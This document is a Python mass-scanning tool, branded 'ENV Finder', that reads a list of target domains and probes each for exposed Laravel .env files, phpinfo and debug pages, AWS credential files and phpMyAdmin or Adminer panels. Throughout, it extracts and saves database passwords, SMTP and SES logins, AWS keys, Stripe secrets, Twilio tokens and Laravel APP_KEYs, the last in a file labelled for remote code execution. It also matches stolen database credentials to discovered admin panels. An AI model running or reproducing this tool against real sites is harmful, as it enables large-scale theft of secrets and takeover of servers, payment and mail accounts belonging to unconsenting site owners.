import requests
import os
import re
import smtplib
from email.mime.text import MIMEText
from multiprocessing.dummy import Pool as ThreadPool
from time import time as timer
from colorama import Fore, Style, init
from datetime import datetime

# --- User Config ---
TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN'
TELEGRAM_CHAT_ID = 'YOUR_TELEGRAM_CHAT_ID'
TEST_EMAIL_TO = 'email@gmail.com'  # Where to send test emails

RESULTS_DIR = f"Results_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

init(autoreset=True)
LIME = Fore.LIGHTGREEN_EX

banner = f"""{LIME}{Style.BRIGHT}
╔════════════════════════════════════════════════════════╗
║                                                        ║
║              ENV Finder By Bob Marley                  ║
║                                                        ║
╚════════════════════════════════════════════════════════╝
{Style.RESET_ALL}"""
print(banner)

print(f"{LIME}{Style.BRIGHT}How To Use:")
print(f"{LIME}{Style.BRIGHT}1. Prepare a text file with your target domains, one per line.")
print(f"{LIME}{Style.BRIGHT}2. Run the script and follow the prompts.\n{Style.RESET_ALL}")

# --- Helper to load or create lists from .txt files ---
def load_or_create_list(filename, default_list):
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            items = f.read().splitlines()
    except Exception:
        with open(filename, 'w', encoding='utf-8') as f:
            for item in default_list:
                f.write(item + '\n')
        items = default_list
    return items

# --- Laravel .env paths (unchanged, always used) ---
path = [
    "/.env",
    "/.env.bak",
    "/.env.backup",
    "/.env.save",
    "/.env.old",
    "/.env~",
    "/.env.txt",
    "/.env.prod",
    "/.env.production",
    "/.env.dev",
    "/.env.development",
    "/.env.local",
    "/.env.test",
    "/.env.testing",
    "/.env.stage",
    "/.env.staging",
    "/.env1",
    "/.env2",
    "/.env_copy",
    "/.env_copy.txt",
    "/.env.back",
    "/.env.bkp",
    "/.env_orig",
    "/.env.original",
    "/.env.save",
    "/.env.save.1",
    "/.env.save.2",
    "/.env.save.old",
    "/.env.save.bak",
    "/.env.save.bkp",
    "/.env.save.txt",
    "/.env.save~",
    "/.env.save.old",
    "/.env.save.backup",
    "/.env.save.example",
    "/.env.save.prod",
    "/.env.save.production",
    "/.env.save.dev",
    "/.env.save.development",
    "/.env.save.local",
    "/.env.save.test",
    "/.env.save.testing",
    "/.env.save.stage",
    "/.env.save.staging",
    "/vendor/.env",
    "/lib/.env",
    "/lab/.env",
    "/cronlab/.env",
    "/cron/.env",
    "/core/.env",
    "/core/app/.env",
    "/core/Database/.env",
    "/database/.env",
    "/config/.env",
    "/assets/.env",
    "/app/.env",
    "/apps/.env",
    "/uploads/.env",
    "/sitemaps/.env",
    "/site/.env",
    "/admin/.env",
    "/web/.env",
    "/public/.env",
    "/en/.env",
    "/tools/.env",
    "/v1/.env",
    "/administrator/.env",
    "/laravel/.env",
    "/api/.env",
    "/backend/.env",
    "/backend/web/.env",
    "/backend/app/.env",
    "/backend/config/.env",
    "/backend/database/.env",
    "/backend/core/.env",
    "/backend/admin/.env",
    "/backend/public/.env",
    "/backend/assets/.env",
    "/backend/uploads/.env",
    "/backend/site/.env",
    "/backend/tools/.env",
    "/backend/vendor/.env",
    "/backend/lib/.env",
    "/backend/lab/.env",
    "/backend/cronlab/.env",
    "/backend/cron/.env",
    "/backend/core/app/.env",
    "/backend/core/Database/.env",
    "/backend/sitemaps/.env",
    "/backend/en/.env",
    "/backend/v1/.env",
    "/backend/administrator/.env",
    "/backend/laravel/.env"
]

# --- New: Load Apache, Debug, and Ports paths from .txt files ---
apachepath = load_or_create_list('apachepath.txt', [
    "/_profiler/phpinfo",
    "/tool/view/phpinfo.view.php",
    "/wp-config.php-backup",
    "/%c0",
    "/debug/default/view.html",
    "/debug/default/view",
    "/frontend/web/debug/default/view",
    "/symfony/public/_profiler/phpinfo",
    "/debug/default/view?panel=config",
    "/phpinfo.php",
    "/phpinfo",
    "/aws.yml",
    "/.env.bak",
    "/info.php",
    "/.aws/credentials",
    "/config/aws.yml",
    "/config.js",
    "/symfony/public/_profiler/phpinfo",
    "/debug/default/view?panel=config",
    "symfony/public",
    "/debug/default/view?panel=config",
    "/frontend_dev.php"
])

debugpath = load_or_create_list('debugpath.txt', [
    '/',
    '/debug/default/view?panel=config',
    '/tool/view/phpinfo.view.php',
    '/wp-config.php-backup',
    '/%c0',
    '/debug/default/view.html',
    '/debug/default/view',
    '/frontend/web/debug/default/view',
    '/web/debug/default/view',
    '/sapi/debug/default/view',
    '/debug/default/view?panel=config'
])

porting = load_or_create_list('ports.txt', [
    ':80',
    ':443',
    ':8080',
    ':8081',
    ':8082'
])

phpmyadmin_paths = [
    "/phpmyadmin/", "/phpMyAdmin/", "/pma/", "/PMA/", "/dbadmin/", "/mysql/", "/myadmin/"
]
adminer_paths = [
    "/adminer/", "/adminer.php", "/adm.php"
]

found_urls = set()
found_phpmyadmin = set()
found_adminer = set()
db_creds_dict = {}

findings = {
    "ENV": 0,
    "PMA": 0,
    "ADM": 0,
    "SES": 0,
    "DB": 0,
    "SMTP": 0,
    "STRIPE": 0,
    "TWILIO": 0,
    "AWS": 0
}

def print_findings():
    print(
        f"{Fore.LIGHTMAGENTA_EX}"
        f"ENV : {findings['ENV']}  "
        f"PMA : {findings['PMA']}  "
        f"ADM : {findings['ADM']}  "
        f"SES : {findings['SES']}  "
        f"DB : {findings['DB']}  "
        f"SMTP : {findings['SMTP']}  "
        f"STRIPE : {findings['STRIPE']}  "
        f"TWILIO : {findings['TWILIO']}  "
        f"AWS : {findings['AWS']}"
        f"{Style.RESET_ALL}"
    )

def safe_find(pattern, text):
    m = re.search(pattern, text, re.MULTILINE)
    return m.group(1).strip() if m else ''

def is_env_file(text):
    env_keys = ["DB_HOST", "DB_USERNAME", "MAIL_HOST", "APP_KEY", "APP_ENV"]
    found = sum(1 for key in env_keys if key in text)
    if found >= 3 and not re.search(r'<html|<!DOCTYPE', text, re.IGNORECASE):
        return True
    return False

def send_telegram(message, parse_mode=None):
    # You can implement this if you want Telegram notifications
    pass

def send_test_email(smtp_host, smtp_port, smtp_user, smtp_pass, mail_from, mail_to, from_name, url):
    # You can implement this if you want SMTP test emails
    return False

def grab_aws(url, text):
    aws_id = safe_find(r'^AWS_ACCESS_KEY_ID\s*=\s*(.*)', text)
    aws_secret = safe_find(r'^AWS_SECRET_ACCESS_KEY\s*=\s*(.*)', text)
    aws_region = safe_find(r'^AWS_DEFAULT_REGION\s*=\s*(.*)', text)
    aws_bucket = safe_find(r'^AWS_BUCKET\s*=\s*(.*)', text)
    if aws_id and aws_secret:
        build = (
            f"URL: {url}\n"
            f"AWS_ACCESS_KEY_ID: {aws_id}\n"
            f"AWS_SECRET_ACCESS_KEY: {aws_secret}\n"
            f"AWS_DEFAULT_REGION: {aws_region}\n"
            f"AWS_BUCKET: {aws_bucket}\n"
        )
        with open(f'{RESULTS_DIR}/aws.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        findings["AWS"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED AWS] aws.txt{Style.RESET_ALL}")
        return True
    return False

def grab_ses_smtp(url, text):
    mail_driver = safe_find(r'^MAIL_DRIVER\s*=\s*(.*)', text)
    mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
    if mail_driver.lower() == "ses" and ("email-smtp" in mailhost or ("amazonaws.com" in mailhost and "ses" in mailhost)):
        mailport = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
        mailuser = safe_find(r'^MAIL_USERNAME\s*=\s*(.*)', text)
        mailpass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
        mailfrom = safe_find(r'^MAIL_FROM_ADDRESS\s*=\s*(.*)', text)
        fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
        if mailuser and mailpass:
            build = (
                f"URL: {url}\n"
                f"MAILHOST: {mailhost}\n"
                f"MAILPORT: {mailport}\n"
                f"MAILUSER: {mailuser}\n"
                f"MAILPASS: {mailpass}\n"
                f"MAILFROM: {mailfrom}\n"
                f"FROMNAME: {fromname}\n"
            )
            with open(f'{RESULTS_DIR}/SMTP_SES.txt', 'a', encoding='utf-8') as f:
                f.write(build + '\n')
                f.flush()
            findings["SES"] += 1
            findings["SMTP"] += 1
            print(f"{Fore.LIGHTGREEN_EX}[SAVED SES SMTP] SMTP_SES.txt{Style.RESET_ALL}")
            return True
    return False

def grab_smtp(url, text):
    mail_driver = safe_find(r'^MAIL_DRIVER\s*=\s*(.*)', text)
    mailhost = safe_find(r'^MAIL_HOST\s*=\s*(.*)', text)
    if mail_driver.lower() == "ses" and ("email-smtp" in mailhost or ("amazonaws.com" in mailhost and "ses" in mailhost)):
        return False  # SES SMTP handled by grab_ses_smtp
    if 'MAIL_HOST' in text:
        mailport = safe_find(r'^MAIL_PORT\s*=\s*(.*)', text)
        mailuser = safe_find(r'^MAIL_USERNAME\s*=\s*(.*)', text)
        mailpass = safe_find(r'^MAIL_PASSWORD\s*=\s*(.*)', text)
        mailfrom = safe_find(r'^MAIL_FROM_ADDRESS\s*=\s*(.*)', text)
        fromname = safe_find(r'^MAIL_FROM_NAME\s*=\s*(.*)', text)
        if not mailuser or not mailpass or mailuser.lower() == "null" or mailpass.lower() == "null":
            return False
        mailpass = mailpass.strip('"\'')
        build = (
            f"URL: {url}\n"
            f"MAILHOST: {mailhost}\n"
            f"MAILPORT: {mailport}\n"
            f"MAILUSER: {mailuser}\n"
            f"MAILPASS: {mailpass}\n"
            f"MAILFROM: {mailfrom}\n"
            f"FROMNAME: {fromname}\n"
        )
        filename = 'SMTP_RANDOM.txt'
        with open(f'{RESULTS_DIR}/{filename}', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        findings["SMTP"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED SMTP] {filename}{Style.RESET_ALL}")
        return True
    return False

def grab_twilio(url, text):
    sid = safe_find(r'^TWILIO_ACCOUNT_SID\s*=\s*(.*)', text)
    token = safe_find(r'^TWILIO_AUTH_TOKEN\s*=\s*(.*)', text)
    phone = safe_find(r'^TWILIO_PHONE_NUMBER\s*=\s*(.*)', text)
    if sid and token and phone:
        build = (
            f"TWILIO_ACCOUNT_SID={sid}\n"
            f"TWILIO_AUTH_TOKEN={token}\n"
            f"TWILIO_PHONE_NUMBER={phone}\n"
        )
        with open(f'{RESULTS_DIR}/twilio.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n')
            f.flush()
        findings["TWILIO"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED TWILIO] twilio.txt{Style.RESET_ALL}")
        return True
    return False

def grab_stripe(url, text):
    stripe_key = safe_find(r'^STRIPE_KEY\s*=\s*(.*)', text)
    stripe_secret = safe_find(r'^STRIPE_SECRET\s*=\s*(.*)', text)
    if stripe_key and stripe_secret:
        build = f'URL: {url}\nSTRIPE_KEY: {stripe_key}\nSTRIPE_SECRET: {stripe_secret}'
        with open(f'{RESULTS_DIR}/stripe.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
            f.flush()
        findings["STRIPE"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED STRIPE] stripe.txt{Style.RESET_ALL}")
        return True
    return False

def grab_db(site_base, url, text):
    db_conn = safe_find(r'^DB_CONNECTION\s*=\s*(.*)', text)
    db_host = safe_find(r'^DB_HOST\s*=\s*(.*)', text)
    db_port = safe_find(r'^DB_PORT\s*=\s*(.*)', text)
    db_name = safe_find(r'^DB_DATABASE\s*=\s*(.*)', text)
    db_user = safe_find(r'^DB_USERNAME\s*=\s*(.*)', text)
    db_pass = safe_find(r'^DB_PASSWORD\s*=\s*(.*)', text)
    creds_tuple = (db_conn, db_host, db_port, db_name, db_user, db_pass)
    if all(creds_tuple) and db_user and db_pass and db_user.lower() != "null" and db_pass.lower() != "null":
        db_creds_dict[site_base] = creds_tuple
        build = (
            f'URL: {url}\n'
            f'DB_CONNECTION: {db_conn}\n'
            f'DB_HOST: {db_host}\n'
            f'DB_PORT: {db_port}\n'
            f'DB_DATABASE: {db_name}\n'
            f'DB_USERNAME: {db_user}\n'
            f'DB_PASSWORD: {db_pass}'
        )
        with open(f'{RESULTS_DIR}/Database.txt', 'a', encoding='utf-8') as f:
            f.write(build + '\n\n')
            f.flush()
        findings["DB"] += 1
        print(f"{Fore.LIGHTGREEN_EX}[SAVED DB] Database.txt{Style.RESET_ALL}")
        return creds_tuple
    return None

def format_phpmyadmin(url, creds):
    if creds:
        db_user = creds[4]
        db_pass = creds[5]
        return f"{url}\nUSER: {db_user}\nPASS: {db_pass}\n\n"
    else:
        return ""

def format_adminer(url, creds):
    if creds:
        db_user = creds[4]
        db_pass = creds[5]
        return f"{url}\nUSER: {db_user}\nPASS: {db_pass}\n\n"
    else:
        return ""

def check_phpmyadmin(site_base):
    creds = db_creds_dict.get(site_base, None)
    if not creds or not creds[4] or not creds[5] or creds[4].lower() == "null" or creds[5].lower() == "null":
        return
    for phpmyadmin_path in phpmyadmin_paths:
        url = site_base.rstrip('/') + phpmyadmin_path
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and "phpMyAdmin" in resp.text:
                if url not in found_phpmyadmin:
                    found_phpmyadmin.add(url)
                    print(f"{Fore.LIGHTGREEN_EX}[FOUND PMA] {url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/phpmyadmin.txt', 'a', encoding='utf-8') as f:
                        f.write(format_phpmyadmin(url, creds))
                        f.flush()
                    findings["PMA"] += 1
                    print_findings()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[ERROR PMA] {url} ({e}){Style.RESET_ALL}")

def check_adminer(site_base):
    creds = db_creds_dict.get(site_base, None)
    if not creds or not creds[4] or not creds[5] or creds[4].lower() == "null" or creds[5].lower() == "null":
        return
    for adminer_path in adminer_paths:
        url = site_base.rstrip('/') + adminer_path
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200 and ("Adminer" in resp.text or "adminer" in resp.text):
                if url not in found_adminer:
                    found_adminer.add(url)
                    print(f"{Fore.LIGHTGREEN_EX}[FOUND ADM] {url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/adminer.txt', 'a', encoding='utf-8') as f:
                        f.write(format_adminer(url, creds))
                        f.flush()
                    findings["ADM"] += 1
                    print_findings()
        except Exception as e:
            print(f"{Fore.LIGHTRED_EX}[ERROR ADM] {url} ({e}){Style.RESET_ALL}")

def is_site_alive(site):
    try:
        resp = requests.get(site, timeout=10)
        return resp.status_code < 400
    except:
        return False

def get_site_base(site):
    if site.endswith('/'):
        site = site[:-1]
    return site

def save_base64_appkey(url, text):
    m = re.search(r'^APP_KEY\s*=\s*(base64:[^\s]+)', text, re.MULTILINE)
    if m:
        appkey = m.group(1).strip()
        base_url = re.match(r'(https?://[^/]+)', url)
        if base_url:
            base_url = base_url.group(1)
        else:
            base_url = url
        with open(f'{RESULTS_DIR}/RCE.txt', 'a', encoding='utf-8') as f:
            f.write(f"{base_url}|{appkey}\n")
            f.flush()
        print(f"{Fore.LIGHTGREEN_EX}[RCE APP_KEY] {base_url}|{appkey}{Style.RESET_ALL}")
        return True
    return False

# --- New: Extract sensitive config lines ---
def extract_sensitive_config(text):
    keys = [
        'APP_NAME', 'APP_ENV', 'APP_KEY', 'APP_DEBUG', 'APP_URL', 'ASSET_URL', 'APP_MODE', 'APP_TIMEZONE',
        'APP_CURRENCY', 'APP_DEFAULT_LANGUAGE', 'APP_CURRENCY_SYMBOL', 'APP_CURRENCY_SYMBOL_POSITION',
        'LOG_CHANNEL', 'LOG_LEVEL',
        'DB_CONNECTION', 'DB_HOST', 'DB_PORT', 'DB_DATABASE', 'DB_USERNAME', 'DB_PASSWORD',
        'REDIS_HOST', 'REDIS_PASSWORD', 'REDIS_PORT',
        'MAIL_MAILER', 'MAIL_HOST', 'MAIL_PORT', 'MAIL_USERNAME', 'MAIL_PASSWORD', 'MAIL_ENCRYPTION',
        'MAIL_FROM_ADDRESS', 'MAIL_FROM_NAME',
        'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'AWS_DEFAULT_REGION',
        'STRIPE_KEY', 'STRIPE_SECRET',
        'TWILIO_ACCOUNT_SID', 'TWILIO_AUTH_TOKEN', 'TWILIO_PHONE_NUMBER',
        'TELNYX_API_KEY', 'TELNYX_MESSAGING_PROFILE_ID',
        'NEXMO_KEY', 'NEXMO_SECRET'
    ]
    found_lines = []
    mail_from_address = None
    mail_from_name = None
    mail_mailer_smtp = False

    for line in text.splitlines():
        for k in keys:
            if line.strip().upper().startswith(k):
                if k == 'MAIL_MAILER' and 'smtp' in line.lower():
                    mail_mailer_smtp = True
                if k == 'MAIL_FROM_ADDRESS':
                    mail_from_address = line
                if k == 'MAIL_FROM_NAME':
                    mail_from_name = line
                found_lines.append(line)
                break

    # If MAIL_MAILER=smtp, ensure MAIL_FROM_ADDRESS and MAIL_FROM_NAME are included
    if mail_mailer_smtp:
        if mail_from_address and mail_from_address not in found_lines:
            found_lines.append(mail_from_address)
        if mail_from_name and mail_from_name not in found_lines:
            found_lines.append(mail_from_name)

    return '\n'.join(found_lines)

def exploit(target):
    if '://' not in target:
        site = 'http://' + target
    else:
        site = target
    site_base = get_site_base(site)

    if not is_site_alive(site_base):
        print(f"{Fore.LIGHTRED_EX}[DEAD SITE] {site_base} (skipping all .env checks){Style.RESET_ALL}")
        return

    # Laravel .env paths
    for read_path in path:
        exploit_path = site_base.rstrip('/') + read_path
        try:
            resp = requests.get(exploit_path, timeout=10)
            if resp.status_code == 200 and is_env_file(resp.text):
                if exploit_path not in found_urls:
                    found_urls.add(exploit_path)
                    print(f"{Fore.LIGHTGREEN_EX}[FOUND] {exploit_path}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/env.txt', 'a', encoding='utf-8') as f:
                        f.write(exploit_path + '\n')
                        f.flush()
                    findings["ENV"] += 1

                    save_base64_appkey(exploit_path, resp.text)
                    grab_aws(exploit_path, resp.text)

                    ses_found = grab_ses_smtp(exploit_path, resp.text)
                    if not ses_found:
                        grab_smtp(exploit_path, resp.text)
                    grab_twilio(exploit_path, resp.text)
                    grab_stripe(exploit_path, resp.text)
                    grab_db(site_base, exploit_path, resp.text)

                    print_findings()
                break
            else:
                print(f"{Fore.LIGHTYELLOW_EX}[FAILED] {exploit_path} (status {resp.status_code}){Style.RESET_ALL}")
        except Exception as error:
            print(f"{Fore.LIGHTRED_EX}[BAD WEBSITE] {exploit_path} ({error}){Style.RESET_ALL}")

    # NEW: Check apachepath
    for apath in apachepath:
        url = site_base.rstrip('/') + apath
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                sensitive = extract_sensitive_config(resp.text)
                if sensitive:
                    print(f"{Fore.LIGHTGREEN_EX}[APACHE FOUND] {url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/apache.txt', 'a', encoding='utf-8') as f:
                        f.write("========================\n")
                        f.write(f"URL: {url}\n")
                        f.write("------------------------\n")
                        f.write(sensitive + "\n")
                        f.write("========================\n\n")
                    grab_aws(url, resp.text)
        except Exception as error:
            pass

    # NEW: Check debugpath
    for dpath in debugpath:
        url = site_base.rstrip('/') + dpath
        try:
            resp = requests.get(url, timeout=10)
            if resp.status_code == 200:
                sensitive = extract_sensitive_config(resp.text)
                if sensitive:
                    print(f"{Fore.LIGHTGREEN_EX}[DEBUG FOUND] {url}{Style.RESET_ALL}")
                    with open(f'{RESULTS_DIR}/debug.txt', 'a', encoding='utf-8') as f:
                        f.write("========================\n")
                        f.write(f"URL: {url}\n")
                        f.write("------------------------\n")
                        f.write(sensitive + "\n")
                        f.write("========================\n\n")
                    grab_aws(url, resp.text)
        except Exception as error:
            pass

    check_phpmyadmin(site_base)
    check_adminer(site_base)

def main():
    if not os.path.exists(RESULTS_DIR):
        os.makedirs(RESULTS_DIR)

    targets_file = input(f"{LIME}{Style.BRIGHT}Enter the filename containing target domains: {Style.RESET_ALL}").strip()
    if not os.path.isfile(targets_file):
        print(f"{Fore.LIGHTRED_EX}File not found: {targets_file}{Style.RESET_ALL}")
        return

    with open(targets_file, 'r', encoding='utf-8') as f:
        targets = [line.strip() for line in f if line.strip()]

    pool = ThreadPool(10)
    start = timer()
    pool.map(exploit, targets)
    pool.close()
    pool.join()
    end = timer()
    print(f"\n{Fore.LIGHTCYAN_EX}Scan completed in {end - start:.2f} seconds.{Style.RESET_ALL}")
    print_findings()

if __name__ == "__main__":
    main()
